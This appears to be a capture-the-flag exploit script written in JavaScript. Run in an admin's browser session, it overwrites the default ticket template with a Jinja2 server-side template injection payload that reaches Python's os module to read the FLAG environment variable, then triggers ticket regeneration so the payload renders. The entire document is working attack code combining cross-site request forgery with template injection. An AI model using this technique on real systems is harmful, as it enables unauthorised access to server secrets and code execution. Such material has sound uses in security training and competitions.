(async () => {
  const tpl = `<html><body>
  <div style="font-family: monospace; font-size: 12px; white-space: pre-wrap; word-break: break-all;">
  {{ cycler.__init__.__globals__.os.environ['FLAG'] }}
  </div>
  </body></html>`;

  await fetch("/admin/templates/1/edit", {
    method: "POST",
    credentials: "include",
    headers: {
      "Content-Type": "application/x-www-form-urlencoded",
    },
    body: new URLSearchParams({
      name: "Default Ticket Template",
      html_content: tpl,
      is_default: "on",
    }),
  });

  await fetch("/admin/tickets/1/regenerate", {
    method: "POST",
    credentials: "include",
  });
})();
